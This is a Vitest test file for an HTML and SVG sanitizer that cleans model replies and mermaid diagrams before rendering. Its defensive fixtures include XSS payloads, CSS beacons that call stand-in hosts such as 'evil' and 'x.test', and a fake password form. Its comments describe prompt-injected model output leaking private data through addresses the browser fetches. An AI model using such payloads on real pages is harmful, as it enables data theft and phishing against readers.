import { describe, expect, it } from "vitest";
import { escapeHtml, sanitizeHtml } from "./html-sanitizer";

describe("sanitizeHtml rich-block allowlist", () => {
	// A3 accordion: the chosen source syntax is raw <details>/<summary> HTML
	// passthrough. These must survive DOMPurify so the collapsible renders.
	it("keeps <details>/<summary> and the open attribute for accordions", () => {
		const out = sanitizeHtml(
			"<details open><summary>More</summary><p>body</p></details>",
		);
		expect(out).toContain("<details");
		expect(out).toContain("<summary>More</summary>");
		expect(out).toContain("open");
		expect(out).toContain("<p>body</p>");
	});

	// A3 checklist: GFM task lists render <input type="checkbox"> in the prose
	// path (e.g. document previews). Confirm the checkbox and its state survive.
	it("keeps task-list checkbox inputs with type and checked", () => {
		const out = sanitizeHtml(
			'<ul><li><input type="checkbox" checked>done</li></ul>',
		);
		expect(out).toContain("<input");
		expect(out).toContain('type="checkbox"');
		expect(out).toContain("checked");
	});

	it("keeps the markdown-table wrapper markup", () => {
		const out = sanitizeHtml(
			'<div class="markdown-table-wrap"><table class="markdown-table"><thead><tr><th>A</th></tr></thead></table></div>',
		);
		expect(out).toContain('class="markdown-table-wrap"');
		expect(out).toContain('class="markdown-table"');
		expect(out).toContain("<th>A</th>");
	});

	it("strips <script> tags", () => {
		const out = sanitizeHtml(
			"<details><summary>x</summary><script>alert(1)</script></details>",
		);
		expect(out).not.toContain("<script");
		expect(out).not.toContain("alert(1)");
	});

	it("strips inline event handlers on allowed rich-block tags", () => {
		const out = sanitizeHtml(
			'<details onclick="steal()"><summary>x</summary></details>',
		);
		expect(out).toContain("<details");
		expect(out).not.toContain("onclick");
	});

	it("strips style attributes by default", () => {
		const out = sanitizeHtml('<summary style="position:fixed">x</summary>');
		expect(out).not.toContain("style=");
	});
});

describe("sanitizeHtml SVG profile (A3 Stage 2 mermaid)", () => {
	// mermaid renders diagrams to an SVG string; we run it through the SVG profile
	// before {@html} injection. The profile is an explicit, maintained allowlist —
	// not a wildcard — so it must keep the SVG shapes mermaid emits while still
	// stripping any active content smuggled inside.
	it("keeps the core SVG shape/label tags mermaid emits", () => {
		const svg = [
			'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">',
			'<g><rect x="0" y="0" width="5" height="5"/>',
			'<path d="M0 0L10 10"/><circle cx="5" cy="5" r="2"/>',
			'<line x1="0" y1="0" x2="10" y2="10"/><polygon points="0,0 5,5 0,5"/>',
			'<text x="1" y="1"><tspan>label</tspan></text></g></svg>',
		].join("");
		const out = sanitizeHtml(svg, { svg: true });
		expect(out).toContain("<svg");
		expect(out).toContain("<g");
		expect(out).toContain("<rect");
		expect(out).toContain("<path");
		expect(out).toContain("<circle");
		expect(out).toContain("<line");
		expect(out).toContain("<polygon");
		expect(out).toContain("<text");
		expect(out).toContain("<tspan");
		expect(out).toContain("label");
	});

	it("keeps mermaid styling when style is opted in (inline style + <style> block)", () => {
		const svg =
			'<svg xmlns="http://www.w3.org/2000/svg"><style>.n{fill:red}</style><rect class="n" style="stroke:blue"/></svg>';
		const out = sanitizeHtml(svg, {
			svg: true,
			allowStyleTags: true,
			allowStyleAttributes: true,
		});
		expect(out).toContain("<style");
		expect(out).toContain("fill:red");
		expect(out).toContain("stroke:blue");
	});

	it("still strips <script> smuggled inside an <svg>", () => {
		const svg =
			'<svg xmlns="http://www.w3.org/2000/svg"><g></g><script>alert(1)</script></svg>';
		const out = sanitizeHtml(svg, { svg: true });
		expect(out).toContain("<svg");
		expect(out).not.toContain("<script");
		expect(out).not.toContain("alert(1)");
	});

	it("still strips inline event handlers (onload) on SVG elements", () => {
		const svg =
			'<svg xmlns="http://www.w3.org/2000/svg"><rect onload="steal()" x="0" y="0"/></svg>';
		const out = sanitizeHtml(svg, { svg: true });
		expect(out).toContain("<rect");
		expect(out).not.toContain("onload");
		expect(out).not.toContain("steal");
	});

	it("strips a javascript: href on an SVG <a> inside the diagram", () => {
		const svg =
			'<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><text x="0" y="0">x</text></a></svg>';
		const out = sanitizeHtml(svg, { svg: true });
		expect(out).not.toContain("javascript:");
	});
});

describe("sanitizeHtml SVG <style> CSS external-reference scrub", () => {
	// DOMPurify passes <style> element CSS text through largely uninspected, so a
	// prompt-injected mermaid diagram's themeCSS could smuggle an outbound request
	// (a CSS beacon / defacement vector) from untrusted model output. We proxy all
	// outbound requests deliberately, so the sanitize gate scrubs external
	// references from <style> element CSS and inline style attributes: @import
	// rules and url(...) targets that are http:/https:/protocol-relative/other
	// schemes are neutralized, while internal url(#fragment) refs (mermaid marker/
	// gradient references) and data: URIs — and all other styling — survive.
	const svgStyleOpts = {
		svg: true,
		allowStyleTags: true,
		allowStyleAttributes: true,
	} as const;

	it("removes an @import rule from a <style> block", () => {
		const out = sanitizeHtml(
			'<svg xmlns="http://www.w3.org/2000/svg"><style>@import url(https://evil/x.css);</style></svg>',
			svgStyleOpts,
		);
		expect(out).toContain("<style");
		expect(out).not.toContain("@import");
		expect(out).not.toContain("evil");
	});

	it("neutralizes an external url() reference in a <style> block", () => {
		const out = sanitizeHtml(
			'<svg xmlns="http://www.w3.org/2000/svg"><style>svg{background:url(https://evil/leak)}</style></svg>',
			svgStyleOpts,
		);
		expect(out).toContain("<style");
		expect(out).not.toContain("evil");
		expect(out).not.toContain("https://");
	});

	it("neutralizes a protocol-relative url() reference in a <style> block", () => {
		const out = sanitizeHtml(
			'<svg xmlns="http://www.w3.org/2000/svg"><style>.p{mask:url(//evil/x)}</style></svg>',
			svgStyleOpts,
		);
		expect(out).toContain("<style");
		expect(out).not.toContain("evil");
		expect(out).not.toContain("//evil");
	});

	it("neutralizes an external url() reference in an inline style attribute", () => {
		const out = sanitizeHtml(
			'<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:url(https://evil/z)"/></svg>',
			svgStyleOpts,
		);
		expect(out).not.toContain("evil");
		expect(out).not.toContain("https://");
	});

	it("keeps benign CSS declarations in a <style> block", () => {
		const out = sanitizeHtml(
			'<svg xmlns="http://www.w3.org/2000/svg"><style>svg{fill:red}</style></svg>',
			svgStyleOpts,
		);
		expect(out).toContain("<style");
		expect(out).toContain("fill:red");
	});

	it("keeps internal url(#fragment) marker/gradient references (mermaid arrowheads)", () => {
		const out = sanitizeHtml(
			'<svg xmlns="http://www.w3.org/2000/svg"><style>.edge{marker-end:url(#arrowhead)}</style><line marker-end="url(#arrowhead)" x1="0" y1="0" x2="4" y2="4"/></svg>',
			svgStyleOpts,
		);
		expect(out).toContain("url(#arrowhead)");
		// The attribute-borne marker ref must survive too (it is not a CSS url()).
		expect(out).toContain('marker-end="url(#arrowhead)"');
	});

	it("keeps a data: URI reference in a <style> block", () => {
		const out = sanitizeHtml(
			'<svg xmlns="http://www.w3.org/2000/svg"><style>.d{background:url(data:image/png;base64,AAAA)}</style></svg>',
			svgStyleOpts,
		);
		expect(out).toContain("data:image/png;base64,AAAA");
	});

	it("still strips <script>/onload/javascript: alongside the CSS scrub", () => {
		const out = sanitizeHtml(
			'<svg xmlns="http://www.w3.org/2000/svg"><style>@import url(https://evil/x.css)</style><rect onload="steal()" x="0" y="0"/><a href="javascript:alert(1)"><text>x</text></a><script>alert(2)</script></svg>',
			svgStyleOpts,
		);
		expect(out).not.toContain("@import");
		expect(out).not.toContain("<script");
		expect(out).not.toContain("onload");
		expect(out).not.toContain("steal");
		expect(out).not.toContain("javascript:");
		expect(out).not.toContain("alert(2)");
	});
});

describe("sanitizeHtml SVG: no link and no address in what a diagram draws (FX-E)", () => {
	// The second gate behind `mermaid-source.ts`: whatever Mermaid made, from a source
	// or a setting nobody foresaw, the SVG the page receives holds no link, no picture
	// from elsewhere, and no CSS that asks for an address, once it is {@html}-injected
	// (the browser asks for a paint server, a cursor or a picture as soon as it draws).
	const opts = {
		svg: true,
		allowStyleTags: true,
		allowStyleAttributes: true,
	} as const;
	const wrap = (inner: string) =>
		`<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">${inner}</svg>`;

	it("takes a link out of the picture and keeps what was inside it", () => {
		const out = sanitizeHtml(
			wrap(
				'<a xlink:href="https://x.test/docs" target="_blank"><g><rect width="4" height="4"/><text>Docs</text></g></a><a href="#local"><text>Local</text></a>',
			),
			opts,
		);
		expect(out).not.toContain("<a");
		expect(out).not.toContain("x.test");
		expect(out).not.toContain("_blank");
		expect(out).toContain("<rect");
		expect(out).toContain("Docs");
		expect(out).toContain("Local");
	});

	it("keeps a link in ordinary HTML (this is the diagram's gate, not the page's)", () => {
		expect(
			sanitizeHtml('<p><a href="https://x.test/docs">Docs</a></p>'),
		).toContain('href="https://x.test/docs"');
	});

	it("keeps only an href that points inside the picture or holds the picture", () => {
		const out = sanitizeHtml(
			wrap(
				'<image href="https://x.test/p.png" width="4" height="4"/>' +
					'<image xlink:href="//x.test/q.png" width="4" height="4"/>' +
					'<image href="data:image/png;base64,iVBORw0KGgo=" width="4" height="4"/>' +
					'<image href="#inside" width="4" height="4"/>',
			),
			opts,
		);
		expect(out).not.toContain("x.test");
		expect(out).toContain("data:image/png;base64,iVBORw0KGgo=");
		expect(out).toContain('href="#inside"');
	});

	it("neutralizes an external url() in a presentation attribute, not only in style", () => {
		const out = sanitizeHtml(
			wrap(
				'<rect fill="url(https://x.test/p.svg#a)" stroke="url(//x.test/s.svg#a)" filter="url(https://x.test/f.svg#f)" clip-path="url(https://x.test/c.svg#c)" mask="url(&quot;https://x.test/m.svg#m&quot;)" marker-end="url(https://x.test/e.svg#e)" cursor="url(https://x.test/c.png), auto" width="4" height="4"/>',
			),
			{ svg: true },
		);
		expect(out).not.toContain("x.test");
		expect(out).toContain("<rect");
	});

	it("keeps what a diagram uses inside itself: marker and gradient references, paths, transforms, styles", () => {
		const svg = wrap(
			'<defs><marker id="arrow"><path d="M0,0L1,1"/></marker></defs><path d="M0,0L9,9" marker-end="url(#arrow)" transform="translate(1,2) rotate(3)" style="fill:#fff;stroke:#333;font-family:&quot;trebuchet ms&quot;,verdana"/><rect fill="url(&quot;#arrow&quot;)" width="4" height="4"/>',
		);
		const out = sanitizeHtml(svg, opts);
		expect(out).toContain('marker-end="url(#arrow)"');
		expect(out).toContain('transform="translate(1,2) rotate(3)"');
		expect(out).toContain('d="M0,0L9,9"');
		expect(out).toContain("fill:#fff");
		expect(out).toContain("trebuchet ms");
	});

	it("reads CSS the way a browser does: an escaped url() is a url()", () => {
		const out = sanitizeHtml(
			wrap(
				'<style>.a{fill:\\75rl(https://x.test/a.svg#a)}.b{fill:\\u\\r\\l(//x.test/b.svg#b)}</style><rect style="fill:\\75 rl(https://x.test/c.svg#c)" width="4" height="4"/><rect fill="\\75rl(https://x.test/d.svg#d)" width="4" height="4"/>',
			),
			opts,
		);
		expect(out).not.toContain("x.test");
		expect(out).not.toMatch(/\\75|\\u\\r/i);
	});

	it("neutralizes the other CSS functions that fetch: image-set() with a string, src()", () => {
		const out = sanitizeHtml(
			wrap(
				'<style>.a{cursor:image-set("https://x.test/c.png" 1x),auto}.b{cursor:-webkit-image-set(url(https://x.test/d.png) 1x),auto}.c{fill:src("https://x.test/e.svg")}</style>',
			),
			opts,
		);
		expect(out).not.toContain("x.test");
	});

	it("leaves a CSS escape that holds no address as it is", () => {
		const out = sanitizeHtml(
			wrap('<style>.q::before{content:"\\201C"}</style><text>x</text>'),
			opts,
		);
		expect(out).toContain('content:"\\201C"');
	});

	it("leaves nothing of the other ways in: an image, a script, a handler, a foreign object", () => {
		const out = sanitizeHtml(
			wrap(
				'<foreignObject><img src="https://x.test/p.png"/></foreignObject><script>1</script><rect onload="x()" width="1" height="1"/>',
			),
			opts,
		);
		expect(out).not.toMatch(/<img|<script|onload|foreignObject/i);
		expect(out).not.toContain("x.test");
	});
});

describe("sanitizeHtml SVG: no value is built to make the gate slow (FX-E)", () => {
	// The gate reads the CSS a diagram produces, which a model's source reaches. A pattern
	// that can be made to take seconds is a way to freeze a reader's tab: the old url()
	// pattern took n squared steps in a run of spaces after `url(` (more than twenty
	// seconds at 40,000), and each `url(` or `image-set(` with no bracket to close it read
	// to the end of the text.
	const opts = {
		svg: true,
		allowStyleTags: true,
		allowStyleAttributes: true,
	} as const;
	const wrap = (inner: string) =>
		`<svg xmlns="http://www.w3.org/2000/svg">${inner}</svg>`;

	it.each([
		[
			"a url( and a long run of spaces",
			`<style>.a{fill:url(${" ".repeat(12_000)}x}</style>`,
		],
		[
			"many url( and no closing bracket",
			`<style>.a{fill:${"url(".repeat(12_000)}}</style>`,
		],
		[
			"many image-set( and no closing bracket",
			`<style>.a{cursor:${"image-set(".repeat(5_000)}}</style>`,
		],
		[
			'many src(" and no closing bracket',
			`<style>.a{fill:${'src("'.repeat(8_000)}}</style>`,
		],
		[
			"a very long attribute of url(",
			`<rect fill="${"url(".repeat(12_000)}" width="1" height="1"/>`,
		],
		["many @import", `<style>${"@import ".repeat(6_000)}</style>`],
	])("takes a moment for %s", (_what, inner) => {
		const started = performance.now();
		sanitizeHtml(wrap(inner), opts);
		expect(performance.now() - started).toBeLessThan(150);
	});

	it("still neutralizes each of many addresses in one value", () => {
		const out = sanitizeHtml(
			wrap(
				`<style>${".a{fill:url(https://x.test/a.svg#a)}".repeat(200)}</style><rect style="fill:url(//x.test/b);stroke:image-set('//x.test/c.png' 1x)" width="1" height="1"/>`,
			),
			opts,
		);
		expect(out).not.toContain("x.test");
	});

	it("neutralizes a url( that nothing closes: CSS ends it at the end of the value, and what is left is its address", () => {
		const out = sanitizeHtml(
			wrap(
				'<rect style="fill:url(https://x.test/a.svg" width="1" height="1"/><rect fill="url(//x.test/b.svg" width="1" height="1"/><style>.a{fill:url(\'https://x.test/c.svg</style>',
			),
			opts,
		);
		expect(out).not.toContain("x.test");
	});

	it("keeps an internal reference and a data URI with a closing bracket of its own", () => {
		const out = sanitizeHtml(
			wrap(
				"<style>.a{fill:url(#grad)}.b{background:url(\"data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'><g transform='translate(1 2)'/></svg>\")}</style>",
			),
			opts,
		);
		expect(out).toContain("url(#grad)");
		expect(out).toContain("data:image/svg+xml");
	});
});

describe("sanitizeHtml: nothing the browser fetches on its own survives", () => {
	// An address in `src`, `srcset`, `poster` or `background` is requested the moment the
	// markup is parsed, with no click, and a model can write one with private data in its
	// path, query or host (a prompt injection in a page it read). So by default none
	// survives, whichever tag carries it; a caller that has a reason names the exact
	// address and tag it allows.
	const FETCHERS: Array<[string, string]> = [
		["an image", '<img src="https://x.test/a.png" alt="a">'],
		[
			"an image with a srcset",
			'<img srcset="https://x.test/a.png 1x, https://x.test/b.png 2x">',
		],
		[
			"a picture",
			'<picture><source srcset="https://x.test/p.png" media="(min-width:1px)"><img src="https://x.test/p2.png"></picture>',
		],
		[
			"a video poster",
			'<video poster="https://x.test/p.png" controls></video>',
		],
		["a video", '<video src="https://x.test/v.mp4" controls></video>'],
		["audio", '<audio src="https://x.test/a.mp3" controls></audio>'],
		[
			"a source and a track",
			'<video controls><source src="https://x.test/v.mp4" type="video/mp4"><track src="https://x.test/t.vtt" kind="captions"></video>',
		],
		[
			"a table's background",
			'<table background="https://x.test/t.png"><tr><td background="https://x.test/c.png">c</td><th background="https://x.test/h.png">h</th></tr></table>',
		],
		["an image button", '<input type="image" src="https://x.test/i.png">'],
		[
			"an <image> tag, which HTML reads as <img>",
			'<image src="https://x.test/i.png">',
		],
		[
			"an address in a template",
			'<template><img src="https://x.test/t.png"></template>',
		],
	];

	it.each(FETCHERS)("removes %s", (_name, html) => {
		for (const options of [{}, { allowStyleAttributes: true }, { svg: true }]) {
			const out = sanitizeHtml(html, options);
			expect(out, JSON.stringify(options)).not.toContain("x.test");
			expect(out).not.toMatch(/<(?:img|source|track)\b/i);
			expect(out).not.toMatch(/\b(?:src|srcset|poster|background)=/i);
		}
	});

	it("removes an image whose address is not allowed whole, with its alt text", () => {
		expect(
			sanitizeHtml(
				'<p>before <img src="https://x.test/a.png" alt="the alt" title="t"> after</p>',
			),
		).toBe("<p>before  after</p>");
	});

	it("removes an address however it is written, relative or absolute", () => {
		for (const src of [
			"/api/favicon?domain=x.test",
			"//x.test/a.png",
			"a.png",
			"./a.png",
			"http://x.test/a.png",
			" https://x.test/a.png",
			"HTTPS://X.TEST/A.PNG",
			"https:&#47;&#47;x.test/a.png",
			"\u0001https://x.test/a.png",
			"blob:https://x.test/0000",
			"ftp://x.test/a.png",
		]) {
			const out = sanitizeHtml(`<img src="${src}">`);
			expect(out, src).toBe("");
		}
	});

	it("keeps a raster picture that holds its own bytes, and nothing else that is data", () => {
		for (const src of [
			"data:image/png;base64,iVBORw0KGgo=",
			"data:image/jpeg;base64,/9j/4AAQ",
			"data:image/jpg;base64,/9j/4AAQ",
			"data:image/gif;base64,R0lGODlh",
			"data:image/webp;base64,UklGRg==",
			"data:image/avif;base64,AAAA",
			"data:IMAGE/PNG;base64,iVBORw0KGgo=",
		]) {
			expect(sanitizeHtml(`<img src="${src}" alt="a">`), src).toContain(
				`src="${src}"`,
			);
		}
		for (const src of [
			"data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=",
			"data:image/svg+xml,%3Csvg%3E%3C/svg%3E",
			"data:text/html;base64,PGI+eDwvYj4=",
			"data:application/octet-stream;base64,AAAA",
			"data:image/png",
			"data:,x",
		]) {
			expect(sanitizeHtml(`<img src="${src}">`), src).toBe("");
		}
		// It is the picture's own bytes on an <img>, nowhere else.
		const out = sanitizeHtml(
			'<video src="data:image/png;base64,AAAA" poster="data:image/png;base64,AAAA"></video><img srcset="data:image/png;base64,AAAA 1x"><table background="data:image/png;base64,AAAA"><tr><td>x</td></tr></table>',
		);
		expect(out).not.toMatch(/data:|<img|poster|src|background/i);
	});

	it("leaves links alone: a click is the reader's choice", () => {
		expect(
			sanitizeHtml(
				'<p><a href="https://x.test/a" target="_blank">link</a></p>',
			),
		).toBe('<p><a href="https://x.test/a" target="_blank">link</a></p>');
	});

	it("still drops what DOMPurify always dropped: frames, objects, links, meta, a base", () => {
		const out = sanitizeHtml(
			'<iframe src="https://x.test/f"></iframe><object data="https://x.test/o"></object><embed src="https://x.test/e"><link rel="stylesheet" href="https://x.test/s.css"><meta http-equiv="refresh" content="0;url=https://x.test/"><base href="https://x.test/">ok',
		);
		expect(out).toBe("ok");
	});

	it("keeps one call's rules out of the next: the hooks are gone when it returns", () => {
		sanitizeHtml('<img src="/ok/a.png"><p style="color:red">x</p>', {
			allowResource: () => true,
			allowStyleAttributes: true,
			inert: { allowClass: () => true },
		});
		expect(sanitizeHtml('<img src="/ok/a.png">')).toBe("");
		expect(sanitizeHtml('<form><input type="text"></form>')).toContain(
			"<input",
		);
		expect(() =>
			sanitizeHtml("<p>x</p>", {
				allowResource: () => {
					throw new Error("a caller's predicate failed");
				},
			}),
		).not.toThrow();
		expect(() =>
			sanitizeHtml('<img src="/a.png">', {
				allowResource: () => {
					throw new Error("a caller's predicate failed");
				},
			}),
		).toThrow("a caller's predicate failed");
		expect(sanitizeHtml('<img src="/ok/a.png">')).toBe("");
	});

	it("closes the HTML-namespace image that slips out of a diagram too", () => {
		// `<img>` ends a foreign-content run, so it lands beside the SVG, in the page.
		const out = sanitizeHtml(
			'<svg xmlns="http://www.w3.org/2000/svg"><rect width="4" height="4"/><img src="https://x.test/p.png"></svg><img srcset="https://x.test/q.png 1x" src="https://x.test/r.png">',
			{ svg: true, allowStyleTags: true, allowStyleAttributes: true },
		);
		expect(out).toContain("<rect");
		expect(out).not.toContain("x.test");
		expect(out).not.toMatch(/<img/i);
	});

	describe("a caller that names the address it allows", () => {
		const asked: Array<{ tag: string; attribute: string; address: string }> =
			[];
		const allowOnly =
			(tag: string, attribute: string, address: string) =>
			(request: { tag: string; attribute: string; address: string }) => {
				asked.push(request);
				return (
					request.tag === tag &&
					request.attribute === attribute &&
					request.address === address
				);
			};

		it("keeps exactly that address on exactly that tag and attribute", () => {
			const allowResource = allowOnly("img", "src", "/api/thing?id=1");
			const out = sanitizeHtml(
				'<img src="/api/thing?id=1" alt="a"><img src="/api/thing?id=2"><img src="/api/thing?id=1&x=1"><video poster="/api/thing?id=1"></video><table background="/api/thing?id=1"><tr><td>x</td></tr></table>',
				{ allowResource },
			);
			expect(out).toBe(
				'<img src="/api/thing?id=1" alt="a"><video></video><table><tbody><tr><td>x</td></tr></tbody></table>',
			);
		});

		it("is told the tag, the attribute and the address as the markup wrote them", () => {
			asked.length = 0;
			sanitizeHtml('<IMG SRC="/a.png"><video POSTER="/p.png"></video>', {
				allowResource: allowOnly("img", "src", "/a.png"),
			});
			expect(asked).toEqual([
				{ tag: "img", attribute: "src", address: "/a.png" },
				{ tag: "video", attribute: "poster", address: "/p.png" },
			]);
		});

		it("asks about every address of a srcset, the way a browser reads the list, and keeps it only when all are allowed", () => {
			const askedOf = (html: string, allow: (address: string) => boolean) => {
				const addresses: string[] = [];
				const out = sanitizeHtml(html, {
					allowResource: (request) => {
						if (request.attribute === "srcset") addresses.push(request.address);
						return allow(request.address);
					},
				});
				return { out, addresses };
			};
			const ok = (address: string) => address.startsWith("/ok/");

			const kept = askedOf(
				'<img src="/ok/a.png" srcset="/ok/a.png 1x, /ok/b.png 2x">',
				ok,
			);
			expect(kept.out).toContain('srcset="/ok/a.png 1x, /ok/b.png 2x"');
			expect(kept.addresses).toEqual(["/ok/a.png", "/ok/b.png"]);

			// A comma inside an address does not end it; a comma after one does.
			expect(
				askedOf(
					'<img src="/ok/a.png" srcset="/ok/a.png,/ok/b.png 1x,/ok/c.png, /ok/d.png">',
					ok,
				).addresses,
			).toEqual(["/ok/a.png,/ok/b.png", "/ok/c.png", "/ok/d.png"]);
			// A descriptor with a bracket in it does not end at the comma inside the bracket.
			expect(
				askedOf(
					'<img src="/ok/a.png" srcset="/ok/a.png 1x(2,3), /ok/b.png">',
					ok,
				).addresses,
			).toEqual(["/ok/a.png", "/ok/b.png"]);

			// One address that is not allowed takes the whole list.
			expect(
				askedOf(
					'<img src="/ok/a.png" srcset="/ok/a.png 1x, https://x.test/b.png 2x">',
					ok,
				).out,
			).toBe('<img src="/ok/a.png">');
			// A list with no address in it asks about nothing and does not stay.
			expect(askedOf('<img src="/ok/a.png" srcset=" , ,">', ok)).toEqual({
				out: '<img src="/ok/a.png">',
				addresses: [],
			});
		});

		it("keeps a picture that has no allowed address out, even beside one that has", () => {
			const out = sanitizeHtml(
				'<picture><source srcset="/ok/p.png"><source srcset="https://x.test/p.png"><img src="/ok/i.png"></picture>',
				{ allowResource: (request) => request.address.startsWith("/ok/") },
			);
			expect(out).toBe(
				'<picture><source srcset="/ok/p.png"><img src="/ok/i.png"></picture>',
			);
		});

		it("does not let a permissive caller pass a script address: DOMPurify still judges the value", () => {
			const out = sanitizeHtml(
				'<img src="javascript:alert(1)"><img src="vbscript:x"><img src="  JaVaScRiPt:alert(2)">',
				{ allowResource: () => true },
			);
			expect(out).not.toMatch(/javascript|vbscript/i);
		});
	});
});

describe("sanitizeHtml inert markup (what a model writes stays in-flow content)", () => {
	// A reply can have come from a page the model read, so its markup must not be able
	// to ask a reader for a password (a form), to cover the page (a fixed overlay, in a
	// style or through the app's own utility classes), or to open something by itself
	// (a dialog, a popover). Text, tables, lists, links, details and highlighted code
	// stay. The option is opt-in: previews and the diagram gate have their own rules.
	const allowClass = (name: string) => /^(?:keep-me|shiki)$/.test(name);
	const inert = { allowStyleAttributes: true, inert: { allowClass } } as const;

	it("drops a form and every control in it, and keeps the words that were in them", () => {
		const out = sanitizeHtml(
			'<form action="https://x.test/steal" method="post"><p>Sign in again</p>' +
				'<input type="password" name="p"><input type="text"><input type="image" src="data:image/png;base64,AAAA">' +
				'<button type="submit" formaction="https://x.test/b">Go</button>' +
				'<select><optgroup label="g"><option>One</option></optgroup></select>' +
				'<textarea>typed</textarea><datalist id="d"><option value="v"></option></datalist></form>',
			inert,
		);
		expect(out).not.toMatch(
			/<(?:form|input|button|select|optgroup|option|textarea|datalist)/i,
		);
		expect(out).not.toMatch(/action=|formaction|x\.test/i);
		expect(out).toContain("<p>Sign in again</p>");
		expect(out).toContain("Go");
		expect(out).toContain("One");
	});

	it("drops a form inside a template and inside a link too", () => {
		const out = sanitizeHtml(
			'<template><form action="https://x.test/t"><input type="password"></form></template>' +
				'<a href="https://x.test/a"><button>Press</button></a>',
			inert,
		);
		expect(out).not.toMatch(/<(?:form|input|button)/i);
		expect(out).toContain('href="https://x.test/a"');
	});

	it("drops a dialog and the attributes that open or focus something by themselves", () => {
		const out = sanitizeHtml(
			'<dialog open>Hello</dialog><div popover id="pop">Popped</div>' +
				'<span popovertarget="pop" popovertargetaction="show">Open</span><p autofocus>Focused</p>',
			inert,
		);
		expect(out).not.toMatch(/<dialog|popover|autofocus/i);
		for (const text of ["Hello", "Popped", "Open", "Focused"]) {
			expect(out).toContain(text);
		}
	});

	it("keeps a task-list checkbox as it is: disabled, with only type, checked and disabled", () => {
		const taskList =
			'<ul><li><input checked="" disabled="" type="checkbox"> done</li><li><input disabled="" type="checkbox"> todo</li></ul>';
		expect(sanitizeHtml(taskList, inert)).toBe(taskList);

		const out = sanitizeHtml(
			'<input type="checkbox" disabled checked name="n" value="v" form="f" class="keep-me" id="i" onclick="x()">',
			inert,
		);
		expect(out).toBe('<input type="checkbox" disabled="" checked="">');
	});

	it("drops a checkbox that a reader could change, and every other kind of input", () => {
		for (const input of [
			'<input type="checkbox" checked>',
			'<input type="radio" disabled>',
			'<input type="text" disabled>',
			"<input disabled>",
			'<input type="image" disabled src="data:image/png;base64,AAAA">',
			'<input type="submit" disabled value="Go">',
			'<input type="password" disabled>',
		]) {
			expect(sanitizeHtml(`<p>${input}</p>`, inert), input).toBe("<p></p>");
		}
	});

	it("keeps only the CSS properties the renderer and Shiki write", () => {
		// The exact shapes Shiki writes for a token and for the block around it.
		for (const kept of [
			'<span style="color:#D73A49">const</span>',
			'<pre style="background-color:#fff;color:#24292e">x</pre>',
			'<span style="font-style:italic;font-weight:bold;text-decoration:underline line-through">x</span>',
			'<span style="color:rgb(1, 2, 3)">x</span>',
		]) {
			expect(sanitizeHtml(kept, inert), kept).toBe(kept);
		}

		const out = sanitizeHtml(
			'<div style="position:fixed;inset:0;top:0;left:0;right:0;bottom:0;z-index:2147483647;width:100vw;height:100vh;transform:translate(0,0);translate:0 0;display:block;background:red;color:red">x</div>',
			inert,
		);
		expect(out).toBe('<div style="color:red">x</div>');
	});

	it("drops a style it cannot read with certainty: escapes, comments, quotes, an important flag", () => {
		for (const style of [
			"pos\\69tion:fixed",
			"color:red;/* ; */position:fixed",
			"color:red;position:fixed/*",
			'font-weight:bold;content:"x"',
			"color:red !important",
			"color:url(https://x.test/a.png)",
			"@import url(https://x.test/a.css)",
			"color:red}body{position:fixed",
			"color:var(--x);position:fixed",
		]) {
			const out = sanitizeHtml(`<div style="${style}">x</div>`, inert);
			expect(out, style).not.toMatch(/position|x\.test|content|import|body/i);
		}
	});

	it("checks the value of a property it keeps, not only its name", () => {
		const out = sanitizeHtml(
			'<span style="color:red;font-weight:100vw;font-style:url(x);text-decoration:blink;background-color:calc(1px);color:#12">x</span>',
			inert,
		);
		expect(out).toBe('<span style="color:red">x</span>');
	});

	it("is not fooled by a property name's case or spacing", () => {
		expect(
			sanitizeHtml(
				'<span style=" COLOR : Red ; POSITION : fixed ">x</span>',
				inert,
			),
		).toBe('<span style="color:Red">x</span>');
	});

	it("keeps only the class names it is told to, and no class attribute that ends up empty", () => {
		expect(
			sanitizeHtml('<div class="keep-me fixed inset-0 z-50">x</div>', inert),
		).toBe('<div class="keep-me">x</div>');
		expect(sanitizeHtml('<div class="fixed inset-0 z-50">x</div>', inert)).toBe(
			"<div>x</div>",
		);
		expect(
			sanitizeHtml(
				'<pre class="shiki github-light" tabindex="0">x</pre>',
				inert,
			),
		).toBe('<pre class="shiki" tabindex="0">x</pre>');
		const alike = '<div class="keep-me shiki">x</div>';
		expect(sanitizeHtml(alike, inert)).toBe(alike);
	});

	it("keeps what a reply is made of: text, links, tables, lists, details and code", () => {
		const page =
			'<h2>Title</h2><p>Some <strong>bold</strong> and <code>code</code> with a <a href="https://x.test/a" target="_blank" rel="noopener noreferrer external">link</a>.</p>' +
			"<table><thead><tr><th>A</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>" +
			'<ol><li>One</li></ol><details open=""><summary>More</summary><p>body</p></details><blockquote><p>q</p></blockquote>';
		expect(sanitizeHtml(page, inert)).toBe(page);
	});

	it("is opt-in: without it a preview keeps the markup it always kept", () => {
		const out = sanitizeHtml(
			'<form action="https://x.test/f"><button>Go</button></form><div class="fixed">x</div>',
		);
		expect(out).toContain("<form");
		expect(out).toContain("<button");
		expect(out).toContain('class="fixed"');
	});
});

describe("html utilities", () => {
	it("escapes HTML-sensitive characters with the default apostrophe entity", () => {
		expect(escapeHtml(`Tom & "Jerry" <'tag'>`)).toBe(
			"Tom &amp; &quot;Jerry&quot; &lt;&#39;tag&#39;&gt;",
		);
	});

	it("preserves legacy apostrophe entity spelling when requested", () => {
		expect(escapeHtml(`it's`, { apostropheEntity: "&#039;" })).toBe(
			"it&#039;s",
		);
	});
});
